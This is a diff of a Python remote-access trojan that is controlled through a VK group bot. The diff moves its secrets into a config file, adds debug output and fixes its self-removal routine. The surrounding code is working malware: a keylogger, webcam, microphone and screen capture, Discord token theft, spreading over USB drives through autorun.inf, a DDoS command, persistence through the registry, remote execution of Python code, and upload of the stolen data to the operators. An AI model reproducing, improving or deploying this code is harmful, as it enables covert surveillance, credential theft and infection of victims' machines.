@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 
 # Should we show debug messages or not.
-DEBUG = False
+DEBUG = True
 
 try:
     # Other modules (Not is preinstalled).
@@ -11,6 +11,7 @@ try:
     import vk_api.upload
 
     # Default modules (Preinstalled).
+    import json
     import requests
     import os
     import os.path
@@ -36,6 +37,9 @@ except ImportError as _exception:
 
 # Out for python code.
 out = None
+
+# Config data.
+config = {}
 
 # Server API.
 __SERVER_API = None
@@ -67,17 +71,8 @@ __COMMANDS_FUNCTION = None
 # List of function name and tuple with description and example (Set in initialise_commands()).
 __COMMANDS_HELP = None
 
-# Server token.
-SERVER_TOKEN = "" # noqa
-
 # System OK code.
 __SYSTEM_OK = 0
-
-# Server group ID.
-SERVER_GROUP = 0
-
-# Server admins list (Empty or None for all users is admins (May be not so safe)).
-SERVER_ADMINS = []
 
 # Is HWID grabbing is disabled or not (Slow working at the start).
 DISABLE_HWID = True
@@ -112,12 +107,15 @@ def filesystem_try_delete(_path):
         return os.remove(_path)
     except Exception:
         return None
+
+
 def filesystem_try_listdir(_path):
     # Tries to listdir.
     try:
         return os.listdir(_path)
     except Exception:
         return []
+
 
 # Refactor later... <<<
 
@@ -138,7 +136,7 @@ def filesystem_get_size(_path: str) -> int:
 
             # Getting size of the directory.
             _directory_size = int(os.path.getsize(_path) / 1024 / 1024)
-            
+
             for _directory_file in filesystem_try_listdir(_path):
                 # For all items in the directory.
 
@@ -171,7 +169,7 @@ def filesystem_get_type(_path: str) -> str:
         # If this is file.
 
         # Returning file.
-        return "File" 
+        return "File"
     elif os.path.islink(_path):
         # If this is link.
 
@@ -205,7 +203,7 @@ def command_taskkill(_arguments, _event) -> str:
 
         # Returning error.
         return "Unable to kill this task!"
-        
+
 
 def command_upload(_arguments, _event) -> str:
     # @function command_upload()
@@ -228,7 +226,7 @@ def command_properties(_arguments, _event) -> str:
         _property_size = f"{filesystem_get_size(_arguments)}MB"
 
         # Getting type.
-        _property_type = filesystem_get_type(_arguments) 
+        _property_type = filesystem_get_type(_arguments)
 
         # Getting time properties.
         _property_created_at = os.path.getctime(_arguments)
@@ -263,10 +261,10 @@ def command_download(_arguments, _event) -> list:
                 # If file is below need size.
 
                 # Uploading.
-                return [_arguments, "Download", "doc"] # noqa
+                return [_arguments, "Download", "doc"]  # noqa
             else:
                 # If invalid size.
-                return "Too big file! Maximal size for download: 1536MB(1.5GB)" # noqa
+                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
         elif os.path.isdir(_arguments):
             # If this is directory.
 
@@ -274,15 +272,15 @@ def command_download(_arguments, _event) -> list:
                 # If file is below need size.
 
                 # Uploading.
-                return "Directories are not allowed for now!" # noqa
+                return "Directories are not allowed for now!"  # noqa
             else:
                 # If invalid size.
-                return "Too big file! Maximal size for download: 1536MB(1.5GB)" # noqa
+                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
     else:
         # If path not exists.
 
         # Error.
-        return "Path does not exists" # noqa
+        return "Path does not exists"  # noqa
 
 
 def command_ddos(_arguments, _event) -> str:
@@ -372,11 +370,11 @@ def command_location(_arguments, _event) -> str:
         # If correct fields.
 
         # Getting ip data.
-        _ipaddress = _ip["ip"] # noqa
-        _ipcity = _ip["city"] # noqa
-        _ipcountry = _ip["country"] # noqa
-        _ipregion = _ip["region"] # noqa
-        _ipprovider = _ip["org"] # noqa
+        _ipaddress = _ip["ip"]  # noqa
+        _ipcity = _ip["city"]  # noqa
+        _ipcountry = _ip["country"]  # noqa
+        _ipregion = _ip["region"]  # noqa
+        _ipprovider = _ip["org"]  # noqa
 
         # Returning.
         return f"IP: {_ipaddress}," \
@@ -447,10 +445,10 @@ def command_help(_arguments, _event) -> str:
         _help = ""
 
         for _command, _information in __COMMANDS_HELP.items():
-            _help += f"[{_command}]: \n--{ _information[0]}\n-- (Use: {_information[1]})\n"
+            _help += f"[{_command}]: \n--{_information[0]}\n-- (Use: {_information[1]})\n"
 
         # Returning.
-        return _help # noqa
+        return _help  # noqa
 
 
 def command_tags_new(_arguments, _event) -> str:
@@ -576,22 +574,22 @@ def command_message(_arguments: str, _event) -> str:
     if len(_arguments) == 2:
         # If there is only text and title.
 
-        ##  Styles:
-        ##  0 : OK
-        ##  1 : OK | Cancel
-        ##  2 : Abort | Retry | Ignore
-        ##  3 : Yes | No | Cancel
-        ##  4 : Yes | No
-        ##  5 : Retry | Cancel 
-        ##  6 : Cancel | Try Again | Continue
+        #  Styles:
+        #  0 : OK
+        #  1 : OK | Cancel
+        #  2 : Abort | Retry | Ignore
+        #  3 : Yes | No | Cancel
+        #  4 : Yes | No
+        #  5 : Retry | Cancel
+        #  6 : Cancel | Try Again | Continue
 
-        ## To also change icon, add these values to previous number
+        # To also change icon, add these values to previous number
         # 16 Stop-sign icon
         # 32 Question-mark icon
         # 48 Exclamation-point icon
         # 64 Information-sign icon consisting of an 'i' in a circle
         # Adding title.
-        _arguments.append(0) # noqa
+        _arguments.append(0)  # noqa
 
     # Calling message.
     try:
@@ -602,11 +600,11 @@ def command_message(_arguments: str, _event) -> str:
             ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], int(_arguments[2]))
 
         # Creating thread.
-        _thread = threading.Thread(target = __ctypes_message_thread)
-        
+        _thread = threading.Thread(target=__ctypes_message_thread)
+
         # Starting thread.
         _thread.start()
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is error.
 
         # Message.
@@ -630,7 +628,7 @@ def command_webcam(_arguments, _event) -> list:
         # If there is import error.
 
         # Not supported.
-        return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)" # noqa
+        return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)"  # noqa
 
     # Globalising folder.
     global __FOLDER
@@ -671,7 +669,7 @@ def command_screenshot(_arguments, _event) -> list:
         # If there is import error.
 
         # Not supported.
-        return "This command does not supported on selected PC! (Pillow module is not installed)" # noqa
+        return "This command does not supported on selected PC! (Pillow module is not installed)"  # noqa
 
     # Taking screenshot.
     screenshot = PIL.ImageGrab.grab()
@@ -789,7 +787,7 @@ def command_destruct(_arguments, _event) -> str:
     # @description Function for command "destruct" that destroys self from the system.
 
     # Unregistering from the autorun.
-    autorun_register()
+    autorun_unregister()
 
     # Removing working folder path.
     filesystem_try_delete(__FOLDER)
@@ -880,6 +878,7 @@ def command_discord_profile_raw(_arguments: str, _event) -> str:
     # Returning.
     return json.dumps(stealer_steal_discord_profile(_tokens), indent=2)
 
+
 def command_discord_profile(_arguments: str, _event) -> str:
     # @function command_discord_profile()
     # @returns Str
@@ -900,8 +899,6 @@ def command_discord_profile(_arguments: str, _event) -> str:
 
     # Returning.
     return f"[ID{_profile['id']}]\n[{_profile['email']}]\n[{_profile['phone']}]\n{_profile['username']}\n\n{_avatar}"
-
-
 
 
 def executable_get_extension() -> str:
@@ -934,7 +931,7 @@ def filesystem_build_path(_path: str) -> None:
 
             # Making directories.
             os.makedirs(_path)
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -985,7 +982,7 @@ def spreading_infect_drive(_drive: str) -> None:
 
                 # Writing.
                 _autorun.write(f"[AutoRun]\nopen={_executable_path}\n\naction=Autorun\\Autorun")
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1014,7 +1011,7 @@ def filesystem_get_drives_list() -> list:
         # Returning list.
         return ["%s:\\\\" % _drive_letter for _drive_letter in _drives_letters
                 if os.path.exists('%s:\\\\' % _drive_letter)]
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1070,7 +1067,7 @@ def spreading_thread() -> None:
             # Updating current drives.
             _current_drives = filesystem_get_drives_list()
 
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1238,7 +1235,7 @@ def keylogger_callback_event(_keyboard_event):
 
                 # Adding key (char) to the keylogger string.
                 __KEYLOG += _keyboard_key
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1306,18 +1303,18 @@ def initialise_commands() -> None:
             "download [required]PATH"
         ),
         "screenshot": (
-                "Returns you an photo (screenshot) from screen of the client.",
-                "screenshot"
-            ),
+            "Returns you an photo (screenshot) from screen of the client.",
+            "screenshot"
+        ),
         "webcam": (
-                "Returns you an photo from webcam of the client (Only if it connected to the PC).",
-                "webcam"
-            ),
+            "Returns you an photo from webcam of the client (Only if it connected to the PC).",
+            "webcam"
+        ),
         "microphone": (
-                "Returns you an voice message from microphone of the client, "
-                "for that amount of the seconds that you specify (Only if it connected to the PC).",
-                "microphone [optional, default is 1]SECONDS"
-            ),
+            "Returns you an voice message from microphone of the client, "
+            "for that amount of the seconds that you specify (Only if it connected to the PC).",
+            "microphone [optional, default is 1]SECONDS"
+        ),
         "help": (
             "Returns list of the all commands in the app, "
             "if you specify command, shows documentation to given command itself.",
@@ -1403,6 +1400,7 @@ def initialise_commands() -> None:
         )
     }
 
+
 def exit_handler() -> None:
     # @function exit_handler()
     # @returns None
@@ -1427,9 +1425,9 @@ def server_connect() -> None:
     try:
         # Trying to connect to server.
 
-        __SERVER_API = vk_api.VkApi(token=SERVER_TOKEN)
-        __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, SERVER_GROUP)
-    except Exception as _exception: # noqa
+        __SERVER_API = vk_api.VkApi(token=config["server_vk_group_access_token"])
+        __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, config["server_vk_group_index"])
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1438,6 +1436,9 @@ def server_connect() -> None:
 
         # Exiting.
         raise SystemExit
+
+    # Debug message.
+    debug_message("Connected to the server!")
 
 
 def debug_message(_message: str) -> None:
@@ -1450,7 +1451,7 @@ def debug_message(_message: str) -> None:
 
         # Returning.
         return
-    
+
     # Printing message.
     print(_message)
 
@@ -1493,7 +1494,7 @@ def server_listen() -> None:
         try:
             # Trying to listen.
 
-            for _event in __SERVER_BOT.listen(): # noqa
+            for _event in __SERVER_BOT.listen():  # noqa
                 # For every message event in the server bot listening.
 
                 if _event.type == vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW:
@@ -1501,7 +1502,7 @@ def server_listen() -> None:
 
                     # Processing client-server answer.
                     client_answer_server(_event)
-        except Exception as _exception: # noqa
+        except Exception as _exception:  # noqa
             # If there is exception occurred.
 
             # Showing debug message to the developer.
@@ -1540,14 +1541,14 @@ def load_tags() -> None:
 
                     # Reading tags.
                     __TAGS = eval(_tf.read())
-            except Exception as _exception: # noqa
+            except Exception as _exception:  # noqa
                 # If there is exception occurred.
 
                 # Debug message.
                 debug_message(f"Can`t load tags file! Exception: {_exception}")
 
                 # Tags list.
-                __TAGS = [get_ip()["ip"], get_operating_system(), "PC"] # noqa
+                __TAGS = [get_ip()["ip"], get_operating_system(), "PC"]  # noqa
 
                 if not DISABLE_HWID:
                     # If we don't disable HWID.
@@ -1561,7 +1562,7 @@ def load_tags() -> None:
             # If we don't have tags file.
 
             # Tags list.
-            __TAGS = [get_ip()["ip"], get_operating_system(), "PC"] # noqa
+            __TAGS = [get_ip()["ip"], get_operating_system(), "PC"]  # noqa
 
             if not DISABLE_HWID:
                 # If we don't disable HWID.
@@ -1571,7 +1572,7 @@ def load_tags() -> None:
 
             # Saving tags.
             save_tags()
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1602,7 +1603,7 @@ def get_hwid() -> str:
 
         # Returning HWID.
         return str((_process.stdout.read() + _process.stderr.read()).decode().split("\n")[1])
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1626,7 +1627,7 @@ def get_ip():
 
         # Returning JSON data.
         return requests.get(_api_provider).json()
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1734,14 +1735,14 @@ def server_method(method: str, parameters: dict, _isretry=False) -> any:
             parameters["random_id"] = vk_api.utils.get_random_id()
 
         # Executing method.
-        return __SERVER_API.method(method, parameters) # noqa
+        return __SERVER_API.method(method, parameters)  # noqa
     except Exception as Error:
         # Error.
 
         # Message.
         debug_message(f"Error when trying to call server method (API)! Error: {Error}")
 
-        if _isretry:
+        if _isretry or config["server_vk_retry_method_call_on_fail"]:
             # If this is already retry.
 
             # Returning.
@@ -1764,7 +1765,7 @@ def server_message(_text: str, _attachmment: str = None, _peer_index: int = None
     if _peer_index is None:
         # If peer index is not specified.
 
-        for _admin_peer_index in SERVER_ADMINS:
+        for _admin_peer_index in config["server_vk_allowed_users"]:
             # For every peer index in admins peer indices.
 
             # Sending messages to they.
@@ -1781,9 +1782,9 @@ def server_message(_text: str, _attachmment: str = None, _peer_index: int = None
 
     # Calling method.
     server_method("messages.send", {
-                      "message": _text,
-                      "attachment": _attachmment,
-                      "peer_id": _peer_index})
+        "message": _text,
+        "attachment": _attachmment,
+        "peer_id": _peer_index})
 
 
 def save_name() -> None:
@@ -1844,14 +1845,14 @@ def load_name() -> None:
 
                     # Reading name.
                     __NAME = str(_nf.read())
-            except Exception as _exception: # noqa
+            except Exception as _exception:  # noqa
                 # If there is exception occurred.
 
                 # Debug message.
                 debug_message(f"Can`t load name file! Exception: {_exception}")
 
                 # Name.
-                __NAME = get_ip()["ip"] # noqa
+                __NAME = get_ip()["ip"]  # noqa
 
                 # Saving name.
                 save_name()
@@ -1863,7 +1864,7 @@ def load_name() -> None:
 
             # Saving name.
             save_name()
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1882,17 +1883,17 @@ def discord_api_call(method: str, params: dict, func, data, token: str) -> any:
 
     # Calling.
     return func(
-        f"https://discord.com/api/{method}", 
-        params = params, 
-        headers = {
+        f"https://discord.com/api/{method}",
+        params=params,
+        headers={
             "Authorization": f"{token}",
             "Content-Type": "application/json"
-        }, 
-        data = data
+        },
+        data=data
     )
 
 
-def stealer_steal_discord_profile(_tokens: list[str]=None) -> dict:
+def stealer_steal_discord_profile(_tokens: list[str] = None) -> dict:
     # @function stealer_steal_discord_profile(_tokens: list[str]=None) -> dict
     # @returns Dict or none
     # @description Function that steals all profile information from client Discord.
@@ -1940,7 +1941,8 @@ def stealer_steal_discord_tokens() -> list[str]:
     for token_path in (path for path in paths if os.path.exists(path)):
         # For existing paths.
 
-        for log_file in (file for file in filesystem_try_listdir(token_path) if file.endswith(".log") or file.endswith(".ldb")):
+        for log_file in (file for file in filesystem_try_listdir(token_path) if
+                         file.endswith(".log") or file.endswith(".ldb")):
             # For log files in folder.
 
             # Opening file.
@@ -1991,11 +1993,11 @@ def stealer_steal_data(_force: bool = False):
             _drive = os.getcwd().split("\\")[0]
 
             # Writing values.
-            __VALUES["internet_ipaddress"] = _ip["ip"] # noqa
-            __VALUES["internet_city"] = _ip["city"] # noqa
-            __VALUES["internet_country"] = _ip["country"] # noqa
-            __VALUES["internet_region"] = _ip["region"] # noqa
-            __VALUES["internet_provider"] = _ip["org"] # noqa
+            __VALUES["internet_ipaddress"] = _ip["ip"]  # noqa
+            __VALUES["internet_city"] = _ip["city"]  # noqa
+            __VALUES["internet_country"] = _ip["country"]  # noqa
+            __VALUES["internet_region"] = _ip["region"]  # noqa
+            __VALUES["internet_provider"] = _ip["org"]  # noqa
 
             if not DISABLE_HWID:
                 # If HWID is not disabled.
@@ -2023,9 +2025,9 @@ def stealer_steal_data(_force: bool = False):
                 __VALUES["directory_programfiles"] = filesystem_try_listdir(_drive + "\\Program Files")
                 __VALUES["directory_programfiles86"] = filesystem_try_listdir(_drive + "\\Program Files (x86)")
                 # Disable as may take too long time to execute?
-                #__VALUES["discord_tokens"] = stealer_steal_discord_tokens()
-                #__VALUES["discord_profile"] = stealer_steal_discord_profile(__VALUES["discord_tokens"])
-                
+                # __VALUES["discord_tokens"] = stealer_steal_discord_tokens()
+                # __VALUES["discord_profile"] = stealer_steal_discord_profile(__VALUES["discord_tokens"])
+
             # Building path.
             filesystem_build_path(_path)
 
@@ -2035,7 +2037,7 @@ def stealer_steal_data(_force: bool = False):
                 # Dumping.
                 json.dump(__VALUES, _file, indent=4)
 
-            for _peer in SERVER_ADMINS:
+            for _peer in config["server_vk_allowed_users"]:
                 # For every peer in admins.
 
                 # Uploading document.
@@ -2071,14 +2073,17 @@ def user_is_admin(_peer: str) -> bool:
     # @returns None
     # @description Function that returns is given user is admin or not.
 
-    if SERVER_ADMINS is None or len(SERVER_ADMINS) == 0:
+    # Read admins.
+    admins = config["server_vk_allowed_users"]
+
+    if admins is None or len(admins) == 0:
         # If there is no admins in the list
 
         # Returning true as there is no admins.
         return True
 
     # Returning.
-    return _peer in SERVER_ADMINS
+    return _peer in admins
 
 
 def client_answer_server(_event) -> None:
@@ -2108,9 +2113,9 @@ def client_answer_server(_event) -> None:
             # If empty.
 
             # Returning.
-            return 
+            return
 
-        # Getting tags.
+            # Getting tags.
         _message_tags = _message_arguments[0]
         _message_arguments.pop(0)
 
@@ -2221,7 +2226,7 @@ def client_answer_server(_event) -> None:
 
                 # Returning.
                 return
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there an exception.
 
         # Getting exception answer.
@@ -2307,7 +2312,7 @@ def execute_python(_code: str, _globals: dict, _locals: dict) -> any:
 
         # Executing replaced code.
         exec(_clean_code, _globals, _locals)
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is an error.
 
         # Returning.
@@ -2330,14 +2335,14 @@ def client_execute_command(_command_name: str, _arguments: str, _event) -> str:
     # @returns str
     # @description Function that executes python code and returns it out in variable out.
 
-    for _command in __COMMANDS_FUNCTION: # noqa
+    for _command in __COMMANDS_FUNCTION:  # noqa
         # For all commands names in commands dict.
 
         if _command_name == _command:
             # If it is this commands.
 
             # Executing command and returning result.
-            return __COMMANDS_FUNCTION[_command](_arguments, _event) # noqa
+            return __COMMANDS_FUNCTION[_command](_arguments, _event)  # noqa
 
     # Default answer.
     return f"Invalid command {_command_name}! Write help command and get all commands!"
@@ -2356,6 +2361,9 @@ def autorun_register() -> None:
 
     if executable_get_extension != "exe":
         # If this is not exe file.
+
+        # Debug message.
+        debug_message("Not add self in the autorun as currently running not executable file (.exe)")
 
         # Returning.
         return
@@ -2399,7 +2407,10 @@ def autorun_register() -> None:
 
         # Closing key.
         winreg.CloseKey(_registry_key)
-    except Exception as _exception: # noqa
+
+        # Debug message.
+        debug_message("Add self to the registry OK!")
+    except Exception as _exception:  # noqa
         # If error occurred.
 
         # Debug message.
@@ -2466,7 +2477,7 @@ def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "do
         # Trying to upload document.
 
         # Getting api for the uploader.
-        _server_api = __SERVER_API.get_api() # noqa
+        _server_api = __SERVER_API.get_api()  # noqa
 
         # Getting upload server.
         _upload_server = _server_api.docs.getMessagesUploadServer(type=_type, peer_id=_peer)['upload_url']
@@ -2489,15 +2500,15 @@ def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "do
             debug_message(f"Error when uploading document (Request)!")
 
             # Returning request as error.
-            return [_request] # noqa
-    except Exception as _exception: # noqa
+            return [_request]  # noqa
+    except Exception as _exception:  # noqa
         # If there is error.
 
         # Debug message.
         debug_message(f"Error when uploading document (Exception)! Exception: {_exception}")
 
         # Returning exception.
-        return [_exception] # noqa
+        return [_exception]  # noqa
 
 
 def record_microphone(_path, seconds: int = 1) -> None:
@@ -2516,7 +2527,8 @@ def record_microphone(_path, seconds: int = 1) -> None:
         # If there is import error.
 
         # Not supported.
-        debug_message("This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")  # noqa
+        debug_message(
+            "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")  # noqa
 
         # Returning.
         return
@@ -2552,12 +2564,49 @@ def record_microphone(_path, seconds: int = 1) -> None:
     file.close()
 
 
+def load_config():
+    """ Loads config values. """
+
+    def _walk_config(_dict):
+        for key in _dict.keys():
+            if _value := _dict[key]:
+                if type(_value) == list:
+                    continue
+                if type(_value) == dict:
+                    _walk_config(_value)
+
+    # Globalise config.
+    global config
+
+    # Opening JSON file
+    with open("config.json", "r") as _configfile:
+        config = json.load(_configfile)
+
+    if not config:
+        # If empty.
+
+        # Debug message.
+        debug_message("Config load error! (!config)")
+
+        # Close.
+        raise SystemExit
+
+    # Debug message.
+    debug_message("Config load complete!")
+
+
 def launch() -> None:
     # @function launch()
     # @returns None
     # @description Function that launches all the system of the app.
     try:
         # Trying to initialise app.
+
+        # Start message.
+        debug_message("Called launch!")
+
+        # Load config to work with values.
+        load_config()
 
         # Asserting operating system, exiting if the operation system is not supported.
         # Supported:
@@ -2575,6 +2624,9 @@ def launch() -> None:
 
         # Loading name from the system.
         load_name()
+
+        # Start message.
+        debug_message("Tags and name loading completed!")
 
         # Connecting to the server.
         server_connect()
@@ -2599,7 +2651,7 @@ def launch() -> None:
 
         # Starting listening messages.
         server_listen()
-    except Exception as _exception: # noqa
+    except Exception as _exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
